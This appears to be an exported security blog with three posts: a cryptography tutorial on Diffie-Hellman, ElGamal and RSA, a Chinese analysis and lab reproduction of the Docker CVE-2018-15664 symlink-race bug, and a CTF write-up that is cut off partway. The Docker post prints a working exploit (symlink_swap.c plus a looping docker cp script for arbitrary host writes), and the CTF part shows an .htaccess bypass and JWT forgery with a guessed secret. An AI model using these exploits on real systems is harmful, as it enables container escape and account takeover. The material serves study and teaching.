<p>In this blog, we are looking into DHKE, to see how it works. Moreover, EL Gamal PKE is a crypto that is based on DHKE, we will learn this as well.</p>
<span id="more"></span>

<h1 id="How-DHKE-works"><a href="#How-DHKE-works" class="headerlink" title="How DHKE works"></a>How DHKE works</h1><p>Let’s say we have Alice and Bob will use their public keys to encrypt a message and private keys to decrypt a message.</p>
<blockquote>
<p><strong>Alice’s public key</strong>: A<br><strong>Alice’s private key</strong>: a<br><strong>Bob’s public key</strong>: B<br><strong>Bob’s private key</strong>: b</p>
<p><strong>public parameters</strong>: p and g, p is a prime number, g&lt;p</p>
</blockquote>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20220404231440796.png" alt="image-20220404231440796"></p>
<p>According to the formulas above, we can see that Alice and Bob will communicate the public keys and the shared keys they generate will be the same. Since there are some mathematical relationships between a private key and a public key, Alice or Bob can use their private keys and others’ public keys to get the shared key.</p>
<p>Then this shared key could be used in any symmetric cipher(like AES).</p>
<p>There’s a discrete log problem that prevents the shared key from being deduced by an attacker.</p>
<h1 id="EL-Gamal-PKE"><a href="#EL-Gamal-PKE" class="headerlink" title="EL Gamal PKE"></a>EL Gamal PKE</h1><h2 id="Differences"><a href="#Differences" class="headerlink" title="Differences"></a>Differences</h2><p><strong>For PKE</strong>, both Alice and Bob will need to publish their public keys, while <strong>for EL-Gamal PKE</strong>, we only need one of them(receiver) to publish the public key.</p>
<p>For <strong>DHKE</strong>, it only explains how a shared key is generated, <strong>EL-Gamal PKE</strong> shows how a message could be encrypted and decrypted using <strong>DHKE</strong>.</p>
<p>A very strong and solid explanation here:</p>
<p><a href="https://www.quora.com/What-is-the-difference-between-Diffie-Hellman-and-ElGamal">https://www.quora.com/What-is-the-difference-between-Diffie-Hellman-and-ElGamal</a></p>
<h2 id="How-it-works"><a href="#How-it-works" class="headerlink" title="How it works"></a>How it works</h2><ul>
<li><p>Asymmetric crypto to generate a shared key</p>
</li>
<li><p>symmetric crypto to encrypt a message</p>
</li>
</ul>
<h2 id="Scenario"><a href="#Scenario" class="headerlink" title="Scenario"></a>Scenario</h2><p>Bob published his key to his website, and was happy with receiving messages from all.</p>
<p>Alice is sending a message to Bob.</p>
<h3 id="Generate-Public-Key-B-Bob"><a href="#Generate-Public-Key-B-Bob" class="headerlink" title="Generate Public Key B(Bob)"></a>Generate Public Key B(Bob)</h3><ul>
<li>pick a random Prime(<code>p</code>), and a <code>g </code> such that<code>g&lt;p</code></li>
<li>pick a random private key <code>b</code></li>
</ul>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20220404231502424.png" alt="image-20220404231502424"></p>
<p>Bob’s public key set will be like <code>&lt;p,g,B&gt;</code></p>
<p>Now Bob’s waiting for someone who is sending a encrypted message to him.</p>
<h3 id="Encryption-Alice"><a href="#Encryption-Alice" class="headerlink" title="Encryption(Alice)"></a>Encryption(Alice)</h3><p>Alice picks a random private key <code>a</code>, then calculate <strong>the shared key</strong> <code>K</code> by using Bob’s public key <code>B</code></p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20220404231539461.png" alt="image-20220404231539461"></p>
<p>Generate public key <code>A</code></p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20220404231707126.png" alt="image-20220404231707126"></p>
<p>Then Alice uses the shared key <code>K</code> to encrypt a plaintext P to get a <strong>ciphertext</strong> <code>C</code></p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20220404231728520.png" alt="image-20220404231728520"></p>
<p>This actually used the <strong>symmetric crypto</strong></p>
<p>Then Alice sends &lt;A, C&gt;(public key, ciphertext) to Bob</p>
<h3 id="Decryption-Bob"><a href="#Decryption-Bob" class="headerlink" title="Decryption(Bob)"></a>Decryption(Bob)</h3><p>According to Alice’s public key <code>A</code>, Bob can calculate the shared key <code>K</code></p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20220404231745506.png" alt="image-20220404231745506"></p>
<p>Then Bob decrypts the message by using the shared key <code>K</code></p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20220404231801397.png" alt="image-20220404231801397"></p>
<h1 id="Calculation-Trick"><a href="#Calculation-Trick" class="headerlink" title="Calculation Trick"></a>Calculation Trick</h1><p><strong>Square &amp; Multiply Algorithm</strong></p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20220404225848657.png" alt="image-20220404225848657"></p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20220404231821863.png" alt="image-20220404231821863"></p>
<p>From the most left number(ignore it)</p>
<p><strong>binary 0</strong>: square</p>
<p><strong>binary 1</strong>: square then times <code>a</code></p>
<h1 id="RSA-crypto"><a href="#RSA-crypto" class="headerlink" title="RSA crypto"></a>RSA crypto</h1><h3 id="RSA-key-generation"><a href="#RSA-key-generation" class="headerlink" title="RSA key generation"></a>RSA key generation</h3><p>choose two primes: <code>p = 5 and q = 11</code></p>
<figure class="highlight mathematica"><table><tr><td class="code"><pre><span class="line"><span class="variable">n</span> <span class="operator">=</span> <span class="variable">p</span><span class="operator">*</span><span class="variable">q</span> <span class="operator">=</span> <span class="number">5</span> <span class="operator">*</span> <span class="number">11</span> <span class="operator">=</span> <span class="number">55</span></span><br><span class="line">ϕ<span class="punctuation">(</span><span class="variable">n</span><span class="punctuation">)</span><span class="operator">=</span><span class="punctuation">(</span><span class="variable">p</span><span class="operator">-</span><span class="number">1</span><span class="punctuation">)</span><span class="operator">*</span><span class="punctuation">(</span><span class="variable">q</span><span class="operator">-</span><span class="number">1</span><span class="punctuation">)</span><span class="operator">=</span><span class="number">4</span><span class="operator">*</span><span class="number">10</span><span class="operator">=</span><span class="number">40</span></span><br></pre></td></tr></table></figure>

<p>Find two numbers e and e according to<code> (e*d) mod ϕ(n) = 1</code>, thus, <code>e = 3, d = 27</code></p>
<p><strong>Public key:</strong> (e,n)=(3, 55)</p>
<p><strong>Private key:</strong> (d,n)=(27, 55)</p>
<h3 id="RSA-encryption"><a href="#RSA-encryption" class="headerlink" title="RSA encryption"></a>RSA encryption</h3><figure class="highlight mathematica"><table><tr><td class="code"><pre><span class="line"><span class="variable">s</span> <span class="operator">=</span> <span class="variable">m</span><span class="operator">^</span><span class="punctuation">(</span><span class="variable">e</span><span class="punctuation">)</span><span class="variable">mod</span> <span class="variable">n</span></span><br></pre></td></tr></table></figure>

<h3 id="RSA-decryption"><a href="#RSA-decryption" class="headerlink" title="RSA decryption"></a>RSA decryption</h3><figure class="highlight mathematica"><table><tr><td class="code"><pre><span class="line"><span class="variable">m</span> <span class="operator">=</span> <span class="variable">s</span><span class="operator">^</span><span class="punctuation">(</span><span class="variable">d</span><span class="punctuation">)</span><span class="variable">mod</span> <span class="variable">n</span></span><br></pre></td></tr></table></figure>



<h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><p>Monash Uni FIT2093</p>
]]></content>
      <categories>
        <category>Web Security</category>
        <category>Cryptography</category>
      </categories>
      <tags>
        <tag>Cryptography</tag>
      </tags>
  </entry>
  <entry>
    <title>CVE-2018-15664符号链接替换漏洞</title>
    <url>/2022/01/23/CVE-2018-15664%E7%AC%A6%E5%8F%B7%E9%93%BE%E6%8E%A5%E6%9B%BF%E6%8D%A2%E6%BC%8F%E6%B4%9E/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>试想在渗透过程中拿到了一个宿主机的权限，但权限过低无法读写文件，应该如何提权或者实现对该宿主机的其他目录进行任意读写操作呢？</p>
<p><a href="https://seclists.org/oss-sec/2019/q2/131">Aleksa Sarai</a>于2019年公布了一个<strong>docker symlink-race attack</strong>漏洞 - 在<strong>Docker 18.06.1-ce-rc2</strong>版本之前，docker中的<code>FollowSymblinkInScope()</code>函数有可能因race condition(条件竞争)遭受**TOCTOU(Time of Check to Time of Use)**攻击，而docker cp的实现大量使用了该函数，因此docker cp存在被利用的危险。</p>
<span id="more"></span>

<h1 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h1><h2 id="TOCTOU-Attack"><a href="#TOCTOU-Attack" class="headerlink" title="TOCTOU Attack"></a>TOCTOU Attack</h2><p>从字面意思上理解，TOCTOU(Time of Check to Time of Use) 实际上就是指check(检查)到use(使用)的这段时间。</p>
<h2 id="Symlink"><a href="#Symlink" class="headerlink" title="Symlink"></a>Symlink</h2><p>Symlink也就是软链接(symbolic link)、符号链接。</p>
<p>假设A是B的软链接，A指向的inode实际上与B指向的inode是不一样的，但是A的数据块中存放了B的路径（具体见操作系统中软链接和硬链接的概念与区别）。</p>
<p>linux中设置一个软链接（类似于Windows上的快捷方式）：</p>
<p><code>ln -s /home/a/old symlink </code></p>
<h2 id="FollowSymlinkInScope"><a href="#FollowSymlinkInScope" class="headerlink" title="FollowSymlinkInScope"></a>FollowSymlinkInScope</h2><p>在docker中，<code>FollowSymlinkInScope</code>函数的作用是将一个path进行安全地解析，解析后再进行使用。</p>
<p>问题就在于 - 解析完之后和使用之前有间隙，用Aleksa的话说就是：</p>
<blockquote>
<p>After the full path has been resolved, the resolved path is passed around a bit and then operated on a bit later.</p>
</blockquote>
<p>这就意味着，如果在解析检查完路径<strong>之后</strong>、使用<strong>之前</strong>添加一个**symlink(软链接)**，最后实际操作的实际是<code>symlink</code>指向的路径，而非其原本想要使用的解析的路径。</p>
<h2 id="docker-cp"><a href="#docker-cp" class="headerlink" title="docker cp"></a>docker cp</h2><p><code>docker cp</code>命令就使用了该函数。</p>
<p><code>docker cp /a ctn_id:/b</code>这段命令表示将<strong>宿主机的/a复制到容器下的/b</strong>。在这个复制的过程中，docker会解析<code>/b</code>，如果<code>/b</code>是容器内的一个<strong>符号链接</strong>，那么就会将其在<strong>容器内</strong>解析为路径，最后再进行复制。</p>
<ul>
<li><p>这里想象一个攻击场景：先让<code>/b</code>是一个容器里的正常路径，在容器检查解析完<code>/b</code>之后，赶在容器使用该解析后的path之前，将<code>/b</code>指向一个恶意的<code>symlink</code>。最后<code>/b</code>这个symlink会在<strong>宿主机上进行解析</strong>，如果该符号链接<code>/b</code>在容器内指向容器中的根目录<code>/</code>，那么现在他会在宿主机上被解析为宿主机的根目录<code>/</code>，而并不是在容器里被解析。<strong>因此这段复制命令，会变成将宿主机下的/a复制到宿主机下的<code>/</code>目录</strong>，这就实现了任意写的功能。</p>
</li>
<li><p>再想象一个攻击场景：<code>docker cp ctn_id:/b /a </code>命令将容器下的<code>/b</code>复制到宿主机下的<code>/a</code>，利用该漏洞，我们可以将<code>/b</code>用symlink指向我们想要读取的任意文件，在宿主机上解析之后，就能将该文件复制到<code>/a</code>上了。这就实现了任意读的功能。</p>
</li>
</ul>
<h1 id="漏洞利用场景"><a href="#漏洞利用场景" class="headerlink" title="漏洞利用场景"></a>漏洞利用场景</h1><p>拿到低权限账户，但该账户可以使用docker cp命令。可以通过该漏洞读取任意文件，也可以通过修改<code>/etc/shadow</code>文件来实现提权。</p>
<blockquote>
<p><strong>题外话</strong>：但其实这种利用场景并不特别实用，如果拿到的宿主机用户并非ROOT权限，却又能使用docker的命令，那么其实使用Docker运行一个特权容器会更为简单。</p>
</blockquote>
<h1 id="环境安装"><a href="#环境安装" class="headerlink" title="环境安装"></a>环境安装</h1><p><a href="https://github.com/Metarget/metarget">使用Metarget靶场安装</a>存在漏洞的docker版本</p>
<ul>
<li>Ubuntu 16.04 or 18.04</li>
<li><strong>Python &gt;= 3.6</strong> (Python 2.x is unsupported!)</li>
<li>pip3</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#安装CVE-2018-15664环境</span></span><br><span class="line">./metarget cnv install cve-2018-15664</span><br></pre></td></tr></table></figure>

<h1 id="POC解析"><a href="#POC解析" class="headerlink" title="POC解析"></a>POC解析</h1><p>我们下载好后的POC结构如下：</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20220124160721960.png" alt="image-20220124160721960"></p>
<h2 id="Dockerfile"><a href="#Dockerfile" class="headerlink" title="Dockerfile"></a>Dockerfile</h2><figure class="highlight dockerfile"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Build the binary.</span></span><br><span class="line"><span class="keyword">FROM</span> opensuse/leap</span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> zypper <span class="keyword">in</span> -y gcc glibc-devel-static</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> <span class="built_in">mkdir</span> /builddir</span></span><br><span class="line"><span class="keyword">COPY</span><span class="language-bash"> symlink_swap.c /builddir/symlink_swap.c</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> gcc -Wall -Werror -static -o /builddir/symlink_swap /builddir/symlink_swap.c</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Set up our malicious rootfs.</span></span><br><span class="line"><span class="keyword">FROM</span> opensuse/leap</span><br><span class="line"><span class="keyword">ARG</span> SYMSWAP_TARGET=/w00t_w00t_im_a_flag</span><br><span class="line"><span class="keyword">ARG</span> SYMSWAP_PATH=/totally_safe_path</span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> <span class="built_in">echo</span> <span class="string">&quot;FAILED -- INSIDE CONTAINER PATH&quot;</span> &gt;<span class="string">&quot;<span class="variable">$SYMSWAP_TARGET</span>&quot;</span></span></span><br><span class="line"><span class="keyword">COPY</span><span class="language-bash"> --from=0 /builddir/symlink_swap /symlink_swap</span></span><br><span class="line"><span class="keyword">ENTRYPOINT</span><span class="language-bash"> [<span class="string">&quot;/symlink_swap&quot;</span>]</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>该Dockerfile主要是为了构建漏洞利用程序symlink_swap（通过gcc来编译），并将其放在容器的根目录下。在该根目录下创建一个<code>w00t_w00t_im_a_flag</code>文件，文件内容为<code>&quot;FAILED -- INSIDE CONTAINER PATH&quot; &gt;&quot;</code></p>
<h2 id="symlink-swap-c"><a href="#symlink-swap-c" class="headerlink" title="symlink_swap.c"></a>symlink_swap.c</h2><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> usage() \</span></span><br><span class="line"><span class="meta">	do &#123; printf(<span class="string">&quot;usage: symlink_swap &lt;symlink&gt;\n&quot;</span>); exit(1); &#125; while(0)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> bail(msg) \</span></span><br><span class="line"><span class="meta">	do &#123; perror(<span class="string">&quot;symlink_swap: &quot;</span> msg); exit(1); &#125; while (0)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* No glibc wrapper for this, so wrap it ourselves. */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> RENAME_EXCHANGE (1 &lt;&lt; 1)</span></span><br><span class="line"><span class="comment">/*int renameat2(int olddirfd, const char *oldpath,</span></span><br><span class="line"><span class="comment">              int newdirfd, const char *newpath, int flags)</span></span><br><span class="line"><span class="comment">&#123;</span></span><br><span class="line"><span class="comment">	return syscall(__NR_renameat2, olddirfd, oldpath, newdirfd, newpath, flags);</span></span><br><span class="line"><span class="comment">&#125;*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* usage: symlink_swap &lt;symlink&gt; */</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> **argv)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (argc != <span class="number">2</span>)</span><br><span class="line">		<span class="built_in">usage</span>();</span><br><span class="line"></span><br><span class="line">	<span class="type">char</span> *symlink_path = argv[<span class="number">1</span>];</span><br><span class="line">	<span class="type">char</span> *stash_path = <span class="literal">NULL</span>;</span><br><span class="line">	<span class="keyword">if</span> (<span class="built_in">asprintf</span>(&amp;stash_path, <span class="string">&quot;%s-stashed&quot;</span>, symlink_path) &lt; <span class="number">0</span>)</span><br><span class="line">		<span class="built_in">bail</span>(<span class="string">&quot;create stash_path&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Create a dummy file at symlink_path. */</span></span><br><span class="line">	<span class="keyword">struct</span> <span class="title class_">stat</span> sb = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">	<span class="keyword">if</span> (!<span class="built_in">lstat</span>(symlink_path, &amp;sb)) &#123;</span><br><span class="line">		<span class="type">int</span> err;</span><br><span class="line">		<span class="keyword">if</span> (sb.st_mode &amp; S_IFDIR)</span><br><span class="line">			err = <span class="built_in">rmdir</span>(symlink_path);</span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">			err = <span class="built_in">unlink</span>(symlink_path);</span><br><span class="line">		<span class="keyword">if</span> (err &lt; <span class="number">0</span>)</span><br><span class="line">			<span class="built_in">bail</span>(<span class="string">&quot;unlink symlink_path&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * Now create a symlink to &quot;/&quot; (which will resolve to the host&#x27;s root if we</span></span><br><span class="line"><span class="comment">	 * win the race) and a dummy directory at stash_path for us to swap with.</span></span><br><span class="line"><span class="comment">	 * We use a directory to remove the possibility of ENOTDIR which reduces</span></span><br><span class="line"><span class="comment">	 * the chance of us winning.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="keyword">if</span> (<span class="built_in">symlink</span>(<span class="string">&quot;/&quot;</span>, symlink_path) &lt; <span class="number">0</span>)</span><br><span class="line">		<span class="built_in">bail</span>(<span class="string">&quot;create symlink_path&quot;</span>);</span><br><span class="line">	<span class="keyword">if</span> (<span class="built_in">mkdir</span>(stash_path, <span class="number">0755</span>) &lt; <span class="number">0</span>)</span><br><span class="line">		<span class="built_in">bail</span>(<span class="string">&quot;mkdir stash_path&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Now we do a RENAME_EXCHANGE forever. */</span></span><br><span class="line">	<span class="keyword">for</span> (;;) &#123;</span><br><span class="line">		<span class="type">int</span> err = <span class="built_in">renameat2</span>(AT_FDCWD, symlink_path,</span><br><span class="line">	                        AT_FDCWD, stash_path, RENAME_EXCHANGE);</span><br><span class="line">		<span class="keyword">if</span> (err &lt; <span class="number">0</span>)</span><br><span class="line">			<span class="built_in">perror</span>(<span class="string">&quot;symlink_swap: rename exchange failed&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>symlink_swap这个恶意文件将会被放在docker容器里，被攻击者用来循环交换symlink和一个正常路径的名字。</p>
<p>如果我们想利用<code>docker cp /shellcode ctr_id:/test</code>命令来完成向宿主机的根目录``/<code>写入</code>shellcode`：</p>
<ul>
<li>使用该恶意程序在容器中创建一个符号链接，该符号链接指向<code>/</code>根目录，命名该符号链接为<code>evil</code></li>
<li>再创建一个<code>/test</code>的正常目录，无限循环地<strong>重命名（交换）</strong><code>/test</code>和<code>/evil</code>的名字。</li>
<li>漏洞未触发时，docker守护进程解析的<code>/test</code>并不是一个符号链接，解析完之后，恶意程序将<code>/test</code>和<code>/evil</code>的名字进行交换(重命名)</li>
<li>当docker开始copy操作的时候，实际copy的<code>ctr_id:/test</code>变成了一个符号链接(也就是重命名后的<code>evil</code>)</li>
<li>该符号链接在宿主机上被解析为<code>/</code>，而这个<code>/</code>会指向宿主机的<code>/</code>，从而我们完成了将<code>shellcode</code>写入宿主机根目录<code>/</code>的跨目录写操作。</li>
</ul>
<h2 id="run-read-sh和run-write-sh"><a href="#run-read-sh和run-write-sh" class="headerlink" title="run_read.sh和run_write.sh"></a>run_read.sh和run_write.sh</h2><p>POC中提供了两个shell可以利用：</p>
<p><strong>run_read.sh</strong></p>
<ul>
<li>使用docker cp将容器内文件复制到宿主机</li>
<li>利用漏洞可以完成在宿主机上任意读的操作</li>
</ul>
<p><strong>run_write.sh</strong></p>
<ul>
<li>使用docker cp将宿主机上的文件复制到容器</li>
<li>利用漏洞可以完成在宿主机上任意写的操作</li>
</ul>
<p>此处我们将使用run_write.sh来模拟任意写的操作</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&quot;FAILED -- HOST FILE UNCHANGED&quot;</span> | sudo <span class="built_in">tee</span> <span class="string">&quot;<span class="variable">$SYMSWAP_TARGET</span>&quot;</span></span><br><span class="line">sudo <span class="built_in">chmod</span> 0444 <span class="string">&quot;<span class="variable">$SYMSWAP_TARGET</span>&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Run and build the malicious image.</span></span><br><span class="line">docker build -t cyphar/symlink_swap \</span><br><span class="line">	--build-arg <span class="string">&quot;SYMSWAP_PATH=<span class="variable">$SYMSWAP_PATH</span>&quot;</span> \</span><br><span class="line">	--build-arg <span class="string">&quot;SYMSWAP_TARGET=<span class="variable">$SYMSWAP_TARGET</span>&quot;</span> build/</span><br><span class="line">ctr_id=$(docker run --<span class="built_in">rm</span> -d cyphar/symlink_swap <span class="string">&quot;<span class="variable">$SYMSWAP_PATH</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;SUCCESS -- HOST FILE CHANGED&quot;</span> | <span class="built_in">tee</span> localpath</span><br><span class="line"></span><br><span class="line"><span class="comment"># Now continually try to copy the files.</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">true</span></span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">	docker <span class="built_in">cp</span> localpath <span class="string">&quot;<span class="variable">$&#123;ctr_id&#125;</span>:<span class="variable">$SYMSWAP_PATH</span>/<span class="variable">$SYMSWAP_TARGET</span>&quot;</span></span><br><span class="line"><span class="keyword">done</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>结合恶意程序和该run_write.sh看，该shell的目的是将localpath文件的内容(“SUCCESS – HOST FILE CHANGED”)写入宿主机的<code>/</code>中，从而实现在宿主机上跨目录任意写的操作。当然我们不能保证我们每次都是在docker守护进程解析之后才进行名字的交换，所以不是每一次都能成功。</p>
<h1 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h1><p>这里我们使用<strong>run_write.sh</strong>来完成攻击</p>
<p>直接<code>./run_write.sh</code>运行即可</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20220124170822558.png" alt="image-20220124170822558"></p>
<h1 id="后续修复"><a href="#后续修复" class="headerlink" title="后续修复"></a>后续修复</h1><p><a href="https://developer.aliyun.com/article/704515">https://developer.aliyun.com/article/704515</a></p>
<h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><p>阿里云容器服务 ACK. (2019). <em>CVE-2018-15664漏洞分析报告-阿里云开发者社区</em>. [online] Available at: <a href="https://developer.aliyun.com/article/704515">https://developer.aliyun.com/article/704515</a> [Accessed 24 Jan. 2022].</p>
<p>Sarai, A. (2019). <em>oss-sec: CVE-2018-15664: docker (all versions) is vulnerable to a symlink-race attack</em>. [online] Available at: <a href="https://seclists.org/oss-sec/2019/q2/131">https://seclists.org/oss-sec/2019/q2/131</a> [Accessed 23 Jan. 2022].</p>
<h1 id="Appendix"><a href="#Appendix" class="headerlink" title="Appendix"></a>Appendix</h1><blockquote>
<p>源码：docker-ce-18.13.1-ce</p>
<p>docker/pkg/symlink/fs.go：FollowSymlinkInScope</p>
</blockquote>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="comment">// FollowSymlinkInScope is a wrapper around evalSymlinksInScope that returns an</span></span><br><span class="line"><span class="comment">// absolute path. This function handles paths in a platform-agnostic manner.</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">FollowSymlinkInScope</span><span class="params">(path, root <span class="type">string</span>)</span></span> (<span class="type">string</span>, <span class="type">error</span>) &#123;</span><br><span class="line">    path, err := filepath.Abs(filepath.FromSlash(path))</span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;&quot;</span>, err</span><br><span class="line">    &#125;</span><br><span class="line">    root, err = filepath.Abs(filepath.FromSlash(root))</span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;&quot;</span>, err</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> evalSymlinksInScope(path, root)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>Web Security</category>
        <category>Cloud Security</category>
      </categories>
      <tags>
        <tag>Web Security</tag>
        <tag>Vulnerability Exploitation</tag>
      </tags>
  </entry>
  <entry>
    <title>DownUnder CTF 2022 writeup</title>
    <url>/2022/09/26/DownUnder-CTF-2022-writeup/</url>
    <content><![CDATA[<h2 id="DownUnder-CTF-2022-writeup"><a href="#DownUnder-CTF-2022-writeup" class="headerlink" title="DownUnder CTF 2022 writeup"></a>DownUnder CTF 2022 writeup</h2><p>It was the second time I participated in CTF, this time I got 4 challenges solved. </p>
<span id="more"></span>

<h3 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h3><h4 id="helicoptering-htaccess-bypass"><a href="#helicoptering-htaccess-bypass" class="headerlink" title="helicoptering (.htaccess bypass)"></a>helicoptering (.htaccess bypass)</h4><p>This challenge is about bypassing the restrictions of <code>.htaccess</code> file.</p>
<p>The first <code>.htaccess</code> file：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">RewriteEngine On</span><br><span class="line">RewriteCond %&#123;HTTP_HOST&#125; !^localhost$</span><br><span class="line">RewriteRule &quot;.*&quot; &quot;-&quot; [F]</span><br></pre></td></tr></table></figure>

<p><strong>Solution:</strong> Change the header <code>host</code> to <code>localhost</code></p>
<p>The second <code>.htaccess</code> file：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">RewriteEngine On</span><br><span class="line">RewriteCond %&#123;THE_REQUEST&#125; flag</span><br><span class="line">RewriteRule &quot;.*&quot; &quot;-&quot; [F]</span><br></pre></td></tr></table></figure>

<p>Since <code>%&#123;THE_REQUEST&#125;</code> is getting the full HTTP Request Line, like <code>GET /two/flag.txt HTTP/1.1</code>, and it will check if the word <code>flag</code> is in there, we need to encode some charactors using <strong>ascii</strong> to bypass the restriction.</p>
<p><strong>Solution:</strong> Change the request <code>flag.txt</code> to <code>f%6clag.txt</code> (<code>%6c</code> is the ascii of <code>l</code>)</p>
<h4 id="Treasure-Hunt-JWT-key-guess"><a href="#Treasure-Hunt-JWT-key-guess" class="headerlink" title="Treasure Hunt( JWT key guess)"></a>Treasure Hunt( JWT key guess)</h4><p>This challenge asked us to find out the <code>treasure</code></p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/20220926113949.png"></p>
<p>On Register page, there’s a Treasures field, which means we would need to find out the <code>treasures</code> field for some account.</p>
<p>After registering an account, I got the JWT token.</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="attribute">Set-Cookie</span><span class="punctuation">: </span>access_token_cookie=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJmcmVzaCI6ZmFsc2UsImlhdCI6MTY2NDE1NjU0NywianRpIjoiNTMxNDAzMzUtZTA5Yi00NDM3LTgzZjQtM2NkMjcyNTAyMDQ2IiwidHlwZSI6ImFjY2VzcyIsInN1YiI6MzksIm5iZiI6MTY2NDE1NjU0NywiZXhwIjoxNjY0MTU3NDQ3fQ.Voo-9ZzfnKfLDoGrXSNHkIqzw2lJ9nKhI2VBvT_uOT0</span><br></pre></td></tr></table></figure>

<p>Using <code>jwo.io</code>:</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/20220926114349.png"></p>
<p>I spent a lot of time to crack this secret, but I found the secret was <code>onepiece</code> as it mentioned a lot here.</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/20220926114520.png"></p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/20220926114603.png"></p>
<p>After copying the token, I used it to access the profile page again, it did not give any errors to me.</p>
<p>So, the secret is correct. Then I change the <code>sub</code> field to <code>1</code> to generate a new JWT token.</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/20220926114801.png"></p>
<h4 id="dyslexxec-XXE-attack"><a href="#dyslexxec-XXE-attack" class="headerlink" title="dyslexxec(XXE attack)"></a>dyslexxec(XXE attack)</h4><p>According to the name of the challenge, I could guess that it was a challenge related to XXE attack.</p>
